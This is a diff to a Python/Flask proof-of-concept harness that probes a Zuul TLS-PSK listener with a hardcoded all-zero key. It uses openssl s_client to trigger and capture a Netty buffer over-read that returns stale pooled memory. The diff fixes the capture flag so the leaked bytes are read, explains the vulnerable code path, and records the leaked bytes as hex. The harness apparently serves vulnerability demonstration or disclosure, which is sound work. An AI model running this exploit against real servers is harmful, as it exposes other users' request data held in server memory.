@@ -12,44 +12,52 @@ ZUUL_HOST = os.environ.get("ZUUL_HOST", "zuul")
 ZUUL_PSK_PORT = int(os.environ.get("ZUUL_PSK_PORT", "7002"))
 PROBE_COUNT = int(os.environ.get("PROBE_COUNT", "10"))
 
-# Must match HardcodedPskProvider.POC_PSK — 32 zero bytes
-POC_PSK = bytes(32)
+POC_PSK = bytes(32)          # 32 zero bytes — matches HardcodedPskProvider.POC_PSK
 PSK_IDENTITY = "poc-client"
 
-# Conservative ceiling for a correct HTTP/1.1 200 response to /healthcheck.
-# "healthy" body + headers is well under 512 bytes.
-# Any bytes above this are stale pooled memory from prior requests.
+# A correct HTTP/1.1 200 response to /healthcheck is:
+#   HTTP/1.1 200 OK\r\n + headers + \r\n + "healthy" = well under 512 bytes.
+# Any bytes received above this ceiling are stale pooled memory from the Netty heap chunk.
 EXPECTED_CEILING = 512
+
+# The HTTP request sent on every probe — 84 bytes.
+HTTP_REQUEST = (
+    b"GET /healthcheck HTTP/1.1\r\n"
+    b"Host: zuul\r\n"
+    b"Connection: close\r\n"
+    b"\r\n"
+)
 
 
 def _openssl_probe(send_http: bool) -> dict:
     """
-    Invoke openssl s_client with TLS 1.2 PSK.
-    Returns {"ok": bool, "stdout": bytes, "stderr": str, "elapsed_ms": int, "error": str}.
+    Run openssl s_client with TLS 1.2 PSK.
+
+    Key flags:
+      -ign_eof   keep reading from the server until it closes the connection,
+                 even after stdin reaches EOF.  Without this flag, openssl exits
+                 the moment it finishes writing stdin, before the server sends
+                 the (over-read, oversized) response.  This is why previous
+                 versions captured 0 bytes.
+
+    Returns {"ok": bool, "stdout": bytes, "stderr": str, "elapsed_ms": int}.
     """
     cmd = [
         "openssl", "s_client",
         "-connect", f"{ZUUL_HOST}:{ZUUL_PSK_PORT}",
         "-tls1_2",
-        "-psk", POC_PSK.hex(),
+        "-psk",          POC_PSK.hex(),
         "-psk_identity", PSK_IDENTITY,
-        "-cipher", "PSK-AES128-CBC-SHA",
+        "-cipher",       "PSK-AES128-CBC-SHA",
         "-quiet",
-        "-no_ign_eof",
+        "-ign_eof",      # wait for server close — critical for capturing the full response
     ]
-
-    stdin_data = (
-        b"GET /healthcheck HTTP/1.1\r\n"
-        b"Host: zuul\r\n"
-        b"Connection: close\r\n"
-        b"\r\n"
-    ) if send_http else b""
 
     started = time.monotonic()
     try:
         proc = subprocess.run(
             cmd,
-            input=stdin_data,
+            input=HTTP_REQUEST if send_http else b"",
             capture_output=True,
             timeout=20,
             check=False,
@@ -57,7 +65,7 @@ def _openssl_probe(send_http: bool) -> dict:
     except subprocess.TimeoutExpired:
         return {
             "ok": False,
-            "error": "openssl timed out — PSK listener not running or handshake failing",
+            "error": "openssl timed out — server did not close the connection",
             "elapsed_ms": 20000,
         }
     except Exception as exc:
@@ -67,8 +75,7 @@ def _openssl_probe(send_http: bool) -> dict:
     stderr = proc.stderr.decode("utf-8", errors="replace")
     stdout = proc.stdout
 
-    # openssl s_client exits 0 on clean close, 1 when the peer sends close_notify
-    # (which is normal). Anything else, or "handshake failure" in stderr, is an error.
+    # exit 0 = clean close, exit 1 = peer sent close_notify — both are normal.
     handshake_failed = (
         "handshake failure" in stderr.lower()
         or "ssl handshake" in stderr.lower()
@@ -80,7 +87,7 @@ def _openssl_probe(send_http: bool) -> dict:
     if send_http and len(stdout) == 0:
         return {
             "ok": False,
-            "error": "handshake ok but no HTTP response — check Zuul routing and backend",
+            "error": "handshake ok but zero bytes received — server closed without responding",
             "elapsed_ms": elapsed_ms,
         }
 
@@ -89,10 +96,19 @@ def _openssl_probe(send_http: bool) -> dict:
 
 def run_raw_probe(index: int) -> dict:
     """
-    One PSK connection + HTTP GET.  Measures bytes received vs EXPECTED_CEILING.
-    With -Dio.netty.noPreferDirect=true, TlsPskUtils.getAppDataBytesAndRelease
-    hits the hasArray() branch, returns the full Netty pool chunk (e.g. 2048 bytes),
-    and the whole chunk is encrypted and sent — not just the HTTP response bytes.
+    One PSK connection.  Sends HTTP_REQUEST, reads back everything the server
+    sends before closing.
+
+    With -Dio.netty.noPreferDirect=true:
+      - ByteBuf.hasArray() is true
+      - TlsPskUtils.getAppDataBytesAndRelease returns byteBufMsg.array()
+        which is the FULL Netty heap pool chunk (e.g. 2048 bytes), not the
+        7-byte "healthy" response
+      - writeApplicationData encrypts the whole chunk
+      - The attacker receives all of it after decryption
+
+    overflow_bytes = bytes_received - EXPECTED_CEILING is the measurable proof.
+    tail_hex shows the stale memory bytes that followed the real HTTP response.
     """
     result = {"index": index, "ok": False}
 
@@ -100,7 +116,7 @@ def run_raw_probe(index: int) -> dict:
     result["elapsed_ms"] = r.get("elapsed_ms", 0)
 
     if not r["ok"]:
-        result["error"] = r.get("error", "unknown error")
+        result["error"] = r.get("error", "unknown")
         return result
 
     stdout = r["stdout"]
@@ -109,11 +125,12 @@ def run_raw_probe(index: int) -> dict:
     first_line = stdout.split(b"\r\n", 1)[0].decode("utf-8", errors="replace") if stdout else ""
 
     result["ok"] = True
-    result["request_size_bytes"] = 84
+    result["request_size_bytes"] = len(HTTP_REQUEST)
     result["bytes_received"] = bytes_received
     result["expected_ceiling_bytes"] = EXPECTED_CEILING
     result["overflow_bytes"] = overflow
     result["overflow_detected"] = overflow > 0
+    # Show the last 128 bytes as hex — these are the stale pool bytes, not part of the response
     result["tail_hex"] = stdout[-128:].hex() if len(stdout) > 128 else stdout.hex()
     result["response_first_line"] = first_line
     return result
@@ -133,10 +150,7 @@ def index() -> str:
 
 @app.post("/run/handshake")
 def run_handshake() -> tuple[Response, int]:
-    """
-    Complete a real TLS 1.2 PSK handshake (no HTTP data).
-    Confirms the listener is up and the zero key is accepted.
-    """
+    """Complete a real TLS 1.2 PSK handshake without sending HTTP data."""
     r = _openssl_probe(send_http=False)
     if r["ok"]:
         return jsonify({
@@ -150,12 +164,6 @@ def run_handshake() -> tuple[Response, int]:
 
 @app.post("/run/leak")
 def run_leak() -> tuple[Response, int]:
-    """
-    Run PROBE_COUNT probes. Each sends an 84-byte HTTP GET over TLS-PSK and
-    measures how many decrypted bytes come back. With the bug active, the server
-    encrypts the full Netty pool chunk instead of readableBytes(), so overflow_bytes
-    will be > 0 and tail_hex will show stale data from prior pooled allocations.
-    """
     results = [run_raw_probe(i + 1) for i in range(PROBE_COUNT)]
     ok_results = [r for r in results if r.get("ok")]
     total_overflow = sum(r.get("overflow_bytes", 0) for r in ok_results)
